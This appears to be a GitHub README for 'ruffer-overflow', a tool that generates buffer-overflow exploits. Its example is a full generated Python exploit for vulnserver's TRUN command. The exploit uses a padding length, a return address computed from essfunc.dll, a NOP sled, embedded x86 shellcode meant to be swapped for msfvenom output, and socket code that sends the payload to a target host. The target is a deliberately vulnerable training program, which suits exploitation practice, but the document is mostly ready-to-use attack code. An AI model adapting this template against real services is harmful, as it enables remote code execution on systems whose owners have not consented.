# ruffer-overflow

buffer overflow detection and exploitation tool for VERY low hanging fruit 

----

## example (secureserverind.exe)

note: secureserverind.exe is actually from the [vulnserver project by stephenbradshaw](https://github.com/stephenbradshaw/vulnserver) 
this command line interaction generates a python file designed to exploit a buffer overflow
![example](/examples/secureserverind.exe/command_line_output.png)

``` python3
#!/usr/bin/python3

# generated by ruffer-overflow [2020-07-28 18:49:51.755495]

#region targeting
BASE_ADDRESS = "62501060" # base address of essfunc.dll
GENERATE_EXPLOIT_FILE = True
EXPLOIT_FILE = "exploit.bin"
EXECUTE_EXPLOIT = False
TARGET_ADDRESS = "192.168.150.245" # target host
TARGET_PORT = "9999" # exposed port on the target host
#endregion

#region imports
import struct
import socket
#endregion

#region payload
buf =  b''
buf += b'TRUN /.:/'
buf += b'A' * 2003
buf += struct.pack("<I", (int(BASE_ADDRESS, 16) + 576)) # little endian pack
buf += b'\x90' * 10 # safety nops

# payload (easy swap from msfvenom)
buf += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
buf += b"\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
buf += b"\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
buf += b"\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c"
buf += b"\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01"
buf += b"\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31"
buf += b"\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d"
buf += b"\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66"
buf += b"\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0"
buf += b"\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f"
buf += b"\x5f\x5a\x8b\x12\xeb\x8d\x5d\x6a\x01\x8d\x85\xb2\x00"
buf += b"\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5"
buf += b"\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a"
buf += b"\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53"
buf += b"\xff\xd5\x65\x63\x68\x6f\x20\x22\x6e\x6f\x20\x73\x74"
buf += b"\x61\x6e\x64\x61\x72\x64\x73\x22\x20\x3e\x20\x63\x6f"
buf += b"\x6d\x70\x72\x6f\x6d\x69\x73\x65\x2e\x74\x78\x74\x00"
#endregion

#region generate file
if GENERATE_EXPLOIT_FILE:
    with open(EXPLOIT_FILE, "wb") as exploit_file:
        exploit_file.write(buf)
#endregion

#region execute
if EXECUTE_EXPLOIT:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((TARGET_ADDRESS, TARGET_PORT))
    print(s.recv(2048))
    s.send(buf)
    print(s.recv(2048))
    s.close()
#endregion

```
